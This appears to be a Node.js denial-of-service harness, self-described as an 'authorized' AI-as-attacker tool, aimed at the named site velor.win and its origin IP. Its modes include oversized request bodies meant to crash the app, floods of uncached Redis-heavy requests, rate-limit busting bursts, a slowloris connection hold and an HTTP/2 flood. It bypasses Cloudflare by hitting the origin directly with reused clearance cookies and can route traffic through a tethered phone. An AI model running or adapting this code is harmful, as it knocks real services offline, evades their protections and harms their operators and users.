#!/usr/bin/env node
// velor_atk.js - consolidated authorized attack harness (AI-as-attacker) for velor.win
// usage: node velor_atk.js <mode> [workers] [seconds]        env: ATK_OUT=<file>
// modes:
//   probe     baseline: health+pid/uptime, key routes, cache headers, track GET+POST
//   track204  POST /api/track tiny JSON (cheapest app touch -> 204)
//   track500  POST /api/track 12KB body (>11KB crash cliff -> nginx 500 + conn close)
//   trackerr  cheap error spam: malformed JSON 400, urlencoded 415, gzip body 400
//   lb        GET /api/economy/leaderboard (~64KB, uncached, Redis-heavy)
//   shop      GET /api/shop (Redis MISCONF 500 signature)
//   mixed     rotation: track500 50% / lb 30% / shop 10% / malformed 10%
//   burst     tiny track burst (bucket-buster: ~15-18/s/IP passes, rest nginx 429)
//   hold      slowloris: hold N TLS conns with POST /api/track CL=2MB, dribbling '{'
'use strict';
const https=require('https'), tls=require('tls'), zlib=require('zlib'), fs=require('fs');
const { performance } = require('perf_hooks');
try{ if(fs.existsSync('cf_cookie.txt') && !process.env.CF_COOKIE){ process.env.CF_COOKIE=fs.readFileSync('cf_cookie.txt','utf8').trim(); if(fs.existsSync('cf_ua.txt')) process.env.CF_UA=fs.readFileSync('cf_ua.txt','utf8').trim(); } }catch(e){}

const MODE=process.argv[2]||'probe';
const W=parseInt(process.argv[3]||(MODE==='burst'?30:MODE==='hold'?100:8),10);
const DUR=parseInt(process.argv[4]||'15',10);
const HOST='velor.win', IP='57.131.163.31';
const LOCAL=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter IP (e.g. phone tether)
const PACE=parseInt(process.env.PACE_MS||'0',10);
const DIRECT=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin IP, SNI/Host = velor.win
const OUT=process.env.ATK_OUT||`atk_${MODE}.out`;
fs.writeFileSync(OUT,`velor_atk ${MODE} w=${W} t=${DUR}s ${new Date().toISOString()}\n`);
const L=s=>{console.log(s);fs.appendFileSync(OUT,s+'\n');};

const agent=new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512});
const tiny=JSON.stringify({v:'a'.repeat(24),events:[{e:'x'}]});
const fat=kb=>{const b=JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:''}]}).length;
  return JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:'A'.repeat(kb*1024-b)}]});};
const gz=zlib.gzipSync(tiny);
const FAT=fat(12);

function req(o={}){
  const {path='/api/health',method='GET',body=null,headers={},timeout=15000}=o;
  return new Promise(res=>{
    const t0=performance.now();
    let fin=false;
    const h={host:HOST,'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36','accept-encoding':'identity','accept':'application/json, text/plain, */*','accept-language':'en-US,en;q=0.9',...headers};
    if(process.env.CF_COOKIE){ h.cookie=process.env.CF_COOKIE; if(process.env.CF_UA){ h['user-agent']=process.env.CF_UA; } }
    if(body!=null){ if(!h['content-type']&&!h['content-encoding'])h['content-type']='application/json';
      h['content-length']=Buffer.byteLength(body); }
    const done=v=>{if(fin)return;fin=true;clearTimeout(wd);res(v);};
    const opt={host:DIRECT?IP:HOST,port:443,path,method,agent,headers:h,localAddress:LOCAL||undefined};
    if(DIRECT)opt.servername=HOST;
    const q=https.request(opt,s=>{
      let n=0,b=''; s.on('data',c=>{n+=c.length;if(b.length<400)b+=c;});
      s.on('end',()=>done({code:s.statusCode,ms:Math.round(performance.now()-t0),bytes:n,
        close:s.headers.connection==='close',cache:s.headers['x-velor-cache'],body:b}));
    });
    // watchdog: plain timer keeps the event loop ref'd even if the socket dies silently
    const wd=setTimeout(()=>{try{q.destroy();}catch(e){}
      done({code:'WD',ms:Math.round(performance.now()-t0),bytes:0});},timeout+500);
    // abrupt close without error/end (velor.win famously does this) -> resolve fast
    q.on('close',()=>setTimeout(()=>done({code:'ABORT',ms:Math.round(performance.now()-t0),bytes:0}),30));
    q.on('error',e=>done({code:'E:'+((e.code||'')+'').slice(0,10),ms:Math.round(performance.now()-t0),bytes:0}));
    if(body!=null)q.write(body);
    q.end();
  });
}

async function baseline(){
  const h=await req({path:'/api/health',timeout:8000});
  const pid=(h.body||'').match(/"pid":(\d+)/); const up=(h.body||'').match(/"uptime":(\d+)/);
  L(`baseline health ${h.code} ${h.ms}ms pid=${pid?pid[1]:'?'} uptime=${up?up[1]:'?'}s`);
  for(const [m,p] of [['GET','/api/track'],['POST','/api/track'],['GET','/api/shop'],
                      ['GET','/api/season'],['GET','/api/economy/leaderboard'],['GET','/']]){
    const r=await req({path:p,method:m,body:m==='POST'?tiny:null,timeout:8000});
    L(`  ${m} ${p} -> ${r.code} ${r.ms}ms ${r.bytes}B cache=${r.cache||'-'}`);
  }
  return pid?pid[1]:'?';
}

function pick(i){
  const c=i%10;
  switch(MODE){
    case 'track204': case 'burst': return {path:'/api/track',method:'POST',body:tiny};
    case 'track500': return {path:'/api/track',method:'POST',body:FAT};
    case 'trackerr':{ const r=i%3;
      if(r===0)return{path:'/api/track',method:'POST',body:'{oops'};
      if(r===1)return{path:'/api/track',method:'POST',body:'a=1',
        headers:{'content-type':'application/x-www-form-urlencoded'}};
      return{path:'/api/track',method:'POST',body:gz,
        headers:{'content-encoding':'gzip','content-type':'application/json'}}; }
    case 'lb':   return {path:'/api/economy/leaderboard?x='+i,method:'GET'};
    case 'shop': return {path:'/api/shop',method:'GET'};
    case 'mixed':
      if(c<5)return{path:'/api/track',method:'POST',body:FAT};
      if(c<8)return{path:'/api/economy/leaderboard?x='+i,method:'GET'};
      if(c<9)return{path:'/api/shop',method:'GET'};
      return{path:'/api/track',method:'POST',body:'{oops'};
    case 'static': return {path:'/robots.txt',method:'GET'};
    case 'favicon': return {path:'/favicon.png',method:'GET'};
    case 'ssr':    return {path:'/',method:'GET'};
    case 'ssr2':   return {path:'/leaderboard',method:'GET'};
    case 'bundle': return {path:'/assets/index-CYtIz3va.js',method:'GET',
      headers:i%2?{'accept-encoding':'gzip'}:{'accept-encoding':'identity'}};
    case 'ws':     return {path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
    case 'pop':    return {path:'/api/popup/stat',method:'POST',
      body:JSON.stringify({id:'atk'+i,kind:'click'})};
    case 'writemix':{ const c=i%10;
      if(c<4)return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'aaa').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})};
      if(c<7)return{path:'/api/popup/stat',method:'POST',
        body:JSON.stringify({id:'atk'+i,kind:'click'})};
      return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'}; }
    case 'melt':{ const c=i%20;
      if(c<8)return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
      if(c<15)return{path:'/assets/index-CYtIz3va.js?x='+i,method:'GET'};
      return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'melt').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})}; }
    default: return {path:'/api/health',method:'GET'};
  }
}

async function hold(){
  const keep=[]; let opened=0,fail=0;
  const one=()=>new Promise(done=>{
    let fin=false;
    const s=tls.connect({host:DIRECT?IP:HOST,port:443,servername:HOST,rejectUnauthorized:false,localAddress:LOCAL||undefined});
    const iv=setInterval(()=>{try{s.write(' ');}catch(e){}},7000);
    s.on('close',()=>clearInterval(iv));
    const end=ok=>{if(fin)return;fin=true;ok?opened++:fail++;done();};
    s.setTimeout(15000);
    s.once('secureConnect',()=>{
      const CK=process.env.CF_COOKIE?('Cookie: '+process.env.CF_COOKIE+'\r\n'):'';
      s.write('POST /api/track HTTP/1.1\r\nHost: velor.win\r\nUser-Agent: '+(process.env.CF_UA||'atk-hold/1')+'\r\n'+
        'Content-Type: application/json\r\n'+CK+'Content-Length: 2097152\r\nConnection: keep-alive\r\n\r\n{');
      keep.push(s); end(true);
    });
    s.once('error',()=>end(false));
    s.once('timeout',()=>end(false));
  });
  const gap=Math.max(0,15000/W);
  for(let i=0;i<W;i++){ one(); if(gap>1)await new Promise(r=>setTimeout(r,gap)); }
  L(`hold: attempted=${W} opened=${opened} failed=${fail}`);
  const t=setInterval(async()=>{const alive=keep.filter(s=>!s.destroyed).length;
    const p=await req({path:'/api/health',timeout:8000});
    L(`  held=${alive} health=${p.code}/${p.ms}ms`);},5000);
  await new Promise(r=>setTimeout(r,DUR*1000));
  clearInterval(t);
  keep.forEach(s=>{try{s.destroy();}catch(e){}});
  await new Promise(r=>setTimeout(r,2000));
  const p=await req({path:'/api/health',timeout:8000}); L(`post-release health ${p.code} ${p.ms}ms`);
}

async function h2run(){
  const http2=require('http2');
  const endAt=Date.now()+DUR*1000; let sent=0,abort=0; const codes={};
  const worker=async()=>{
    let conn=null;
    const ready=()=>new Promise(r=>{conn=http2.connect(DIRECT?'https://'+IP:'https://velor.win',{servername:HOST,localAddress:LOCAL||undefined});conn.once('connect',r);conn.once('error',r);});
    await ready();
    while(Date.now()<endAt){
      try{
        sent++;
        const st=conn.request({':method':'POST',':path':'/api/track',':authority':HOST,'content-type':'application/json',...(process.env.CF_COOKIE?{cookie:process.env.CF_COOKIE}:{})});
        const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
        st.write(MODE==='h2trk'?FAT:tiny); st.end();
        const c=await p; codes[c]=(codes[c]||0)+1;
        if(c==='E'||c==='ABORT'){abort++;try{conn.close();}catch(e){} await ready();}
      }catch(e){abort++;try{conn.close();}catch(_){} await ready();}
    }
    try{conn.close();}catch(e){}
  };
  const mon=setInterval(async()=>{const p=await req({path:'/api/health',timeout:8000});L(`  t+${DUR-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  await Promise.all(Array.from({length:W},(_,w)=>worker(w)));
  clearInterval(mon);
  L(`h2 sent=${sent} (${(sent/DUR).toFixed(1)}/s) codes=${JSON.stringify(codes)} aborts=${abort}`);
}

(async()=>{
  L(`== velor_atk ${MODE} - ${W} workers ${DUR}s ==`);
  const pid0=await baseline();
  if(MODE==='probe'){L('done');return;}
  if(MODE==='hold'){await hold();L('done');return;}
  if(MODE==='h2'||MODE==='h2trk'){await h2run();const p1=await baseline();L(pid0===p1?'pid stable':(p1==='?'?'pid unreadable at post-check (health no-answer)':'PID CHANGED '+pid0+'->'+p1));L('done');return;}
  const endAt=Date.now()+DUR*1000; let sent=0,closes=0; const codes={}; let first429=null;
  const mon=setInterval(async()=>{const p=await req({path:'/api/health',timeout:8000});
    L(`  t+${DUR-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  const worker=async w=>{let i=0;while(Date.now()<endAt){
    const t0w=Date.now(); const r=await req(pick(w*9973+i++)); sent++;
    codes[r.code]=(codes[r.code]||0)+1; if(r.close)closes++;
    if(r.code===429&&first429===null)first429=sent; if(PACE>0){const el=Date.now()-t0w; if(el<PACE)await new Promise(rr=>setTimeout(rr,PACE-el));}}};
  await Promise.all(Array.from({length:W},(_,w)=>worker(w)));
  clearInterval(mon);
  L(`sent=${sent} (${(sent/DUR).toFixed(1)}/s) codes=${JSON.stringify(codes)} conn-close=${closes} first429@req=${first429??'-'}`);
  const pid1=await baseline();
  L(pid0===pid1?`pid stable (${pid0}) - no restart`:(pid1==='?'?`pid unreadable at post-check (health no-answer); baseline pid was ${pid0}`:`PID CHANGED ${pid0} -> ${pid1} - app restarted!`));
  L('done');
})().catch(e=>L('FATAL '+e.message));
